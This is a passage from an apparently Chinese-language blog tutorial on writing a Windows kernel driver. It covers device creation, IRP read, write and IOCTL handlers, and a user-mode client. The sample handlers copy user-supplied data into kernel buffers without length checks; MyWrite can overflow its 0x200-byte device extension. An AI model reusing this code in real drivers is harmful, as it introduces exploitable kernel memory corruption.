href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize"><strong>DriverEntry</strong></a> 的函数，该函数在加载驱动程序之后会立即得到调用。 <strong>DriverEntry</strong> 函数使用指向驱动程序实现的一些其他函数的指针来填充 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object"><strong>DRIVER_OBJECT</strong></a> 结构的某些成员。 例如，<strong>DriverEntry</strong> 函数使用指向驱动程序的 <strong>Unload</strong> 函数的指针来填充 <strong>DRIVER_OBJECT</strong> 结构的 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload"><em>Unload</em></a> 成员</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/021fcdc7adca77ff40fe201966cd80c5.png" alt="image-20240116143040078" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br></pre></td></tr></table></figure><p>根据上面的文档，创建的函数和主函数<code>Entry</code>差不多，<strong>这里用的是设备对象，不是驱动对象</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS </span></span><br><span class="line"><span class="function"><span class="title">MyCreate</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Opened\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ii-关闭句柄"><a class="markdownIt-Anchor" href="#ii-关闭句柄"></a> II. 关闭“句柄”</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClose</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Closed\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClean</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Clean\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4ece7b08bbaf2850915e56ec056c6bb5.png" alt="image-20240116150816039" /></p><p><img src="https://img.joe1sn.top/uploads/big/f997951f4d3315156cf557ea3c2f1f61.png" alt="image-20240116150757589" /></p><p>成功加载</p><h4 id="iii-在ring3进行交互"><a class="markdownIt-Anchor" href="#iii-在ring3进行交互"></a> III. 在Ring3进行交互</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/1d37d1b44725a3e158122215fe25ae4b.png" alt="image-20240116161601128" /></p><h1 id="c-二阶段"><a class="markdownIt-Anchor" href="#c-二阶段"></a> C. 二阶段</h1><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice</a></p><p>关于创建设备的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in] DeviceExtensionSize</span><br></pre></td></tr></table></figure><p>指定要为 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/device-extensions">设备对象的设备扩展</a> 分配的驱动程序确定的字节数。 设备扩展的内部结构是驱动程序定义的。</p></blockquote><ul><li>维护设备状态信息。</li><li>为驱动程序使用的任何内核定义对象或其他系统资源（如旋转锁）提供存储。</li><li>保存驱动程序必须在系统空间中驻留的任何数据，以执行其 I/O 操作。</li></ul><p>那么这就是一段描述要传输的数据的空间的大小的值。</p><h3 id="从驱动中读取"><a class="markdownIt-Anchor" href="#从驱动中读取"></a> 从驱动中读取</h3><p>驱动<code>MyRead</code>函数和<code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyRead</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Want Read %x\n&quot;</span>, ReadSize);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Buffer, <span class="string">&quot;Message From Driver&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR Test[<span class="number">0x40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD lpRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hDevice, Test, <span class="number">30</span>, &amp;lpRead, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p -%s--%d\n&quot;</span>, Test, Test,lpRead);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>30</code>是要读取的字节</li><li><code>lpRead</code>是真实读取的字节</li></ul><p><img src="https://img.joe1sn.top/uploads/big/3d59cd4377a3136afc0e76d05ef229d5.png" alt="image-20240116163249545" /></p><p>每向下传递一层需要一个设备栈（可以试着从自己设计这样一个模式的角度想想）</p><p><code>SystemBuffer</code>和<code>pIrp-&gt;MdlAddress</code>是同一块物理地址的两个不同虚拟地址（不同的映射）。</p><p><img src="https://img.joe1sn.top/uploads/big/c97a37804385b4dfaec106605e5f35d4.png" alt="image-20240116165239380" /></p><p>需要设置读写方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"><span class="comment">//设备创建成功，绑定符号链接</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/89ee511b22780e94cccf65aab59b4943.png" alt="image-20240116171657645" /></p><h3 id="向驱动中写入"><a class="markdownIt-Anchor" href="#向驱动中写入"></a> 向驱动中写入</h3><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(hDevice, <span class="string">&quot;This is From Ring3.&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;This is From Ring3.&quot;</span>), &amp;lpRead, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyWrite</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Wrtitten\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Write.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Write Read %x\n&quot;</span>, ReadSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(pdevice-&gt;DeviceExtension, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(pdevice-&gt;DeviceExtension, Buffer, ReadSize);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;--%p-%s\n&quot;</span>, Buffer, (PCHAR)pdevice-&gt;DeviceExtension);</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/13f59b1ae2e3d665dcc0de8b593d6297.png" alt="image-20240116173208413" /></p><h3 id="ioctl自定义控制io"><a class="markdownIt-Anchor" href="#ioctl自定义控制io"></a> [IOCTL]自定义控制IO</h3><p><code>IRP_MJ_DEVICE_CONTROL</code>，定义IOCTL操作，<strong>很多内核的交互大多都是依靠此方式</strong></p><p>这里程序接收一个数字返回值x2</p><p>驱动</p><p>定义操作标识</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>0x9888：标识符号</li></ul><p>编写函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">MyControl</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    DbgPrint(<span class="string">&quot;My Device Has IOCTL\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">    ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;   <span class="comment">//功能码</span></span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;     <span class="comment">//出入长度</span></span><br><span class="line">    <span class="comment">//ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;   //输出长度</span></span><br><span class="line">    ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ioCode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">    &#123;</span><br><span class="line">        DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;   <span class="comment">//取出传输的数据</span></span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">        inData *= <span class="number">2</span>;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">        *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;             <span class="comment">//写回操作</span></span><br><span class="line">        ioInfo = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">        ioInfo = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = ioInfo;</span><br><span class="line">    IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbf7757867f48efe014c738e8fb56bc.png" alt="image-20240116185236732" /></p><h3 id="一些关键函数"><a class="markdownIt-Anchor" href="#一些关键函数"></a> 一些关键函数</h3><p><code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建设备</span></span><br><span class="line">    UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">    PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x200</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">    <span class="comment">//设备创建成功，绑定符号链接</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device &amp; Symbolic Link Created\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Function Settal Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DriverUnload</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于在Ring3交互的项目的主函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// R3Control.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;now IOCTL\n&quot;</span>;</span><br><span class="line">    DWORDLONG a = <span class="number">64</span>;</span><br><span class="line">    DWORDLONG b = <span class="number">0</span>;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_MUL, &amp;a, <span class="built_in">sizeof</span>(DWORDLONG), &amp;b, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">    <span 